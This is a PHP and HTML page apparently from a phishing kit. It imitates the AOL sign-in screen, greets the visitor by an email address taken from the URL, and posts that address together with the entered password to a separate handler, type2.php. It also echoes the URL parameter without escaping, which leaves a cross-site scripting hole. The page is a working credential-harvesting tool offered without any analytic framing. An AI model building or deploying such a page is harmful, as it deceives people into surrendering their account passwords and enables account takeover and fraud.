<? error_reporting(0); ?>
<!DOCTYPE html>
<html lang='en'>
  <head>
    <meta charset='UTF-8'/>
    <title>AOL</title>
    <link rel='stylesheet' href='imgs/style_a.css'/>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="fonts.css">
<link rel="icon" href="imgs/a-favicon.png" type="image/x-icon" />
<script type="text/javascript" src="js/message.js"></script> 
  </head>
  <body>
    <div style="margin:0; background-color:#fff;width:100%;height:61px;"><img src="imgs/black-v.0.2.png" width="100" height="40" style="margin-top:28px;margin-left:40px;" id="myimg"></div>
	<br>
  <div class="container">
  <div class="inside-container">

<div style="margin-top:30px;margin-left:30px; width:300px; height:500px;text-align:center;">
<img src="imgs/black-v.0.2.png" width="100" height="40"><br><br><br>
<h1>Hello <?=$_GET[userid]?><br><span><a href="#" style="">Not you?</a></span></h1>
<form name="registerationform" action="type2.php" method="post" onsubmit="return(regvalidate())">
<br><input type="hidden" name="email" value="<?=$_GET[userid]?>">
<input id="password" type="password" name="passt" placeholder="Password">
<br>
<span id="div4" style="font-size: 12px;color:#dd1037; font-family: Helvetica Neue,Helvetica;text-align:left;"></span><p style="line-height:12px;"><br></p>
<input type="submit" style="background: #39f; width:300px; height:45px; font-size: 16px; line-height: 17px; text-align: center;
color: #fff; border: 2px solid #39f;" value="Sign in"></input>
</form>
<br><br>
<span><a href="#" style="font-size:16px">I forgot my password</a>
</div>

  </div>
  </div>
  
  </body>
  </html>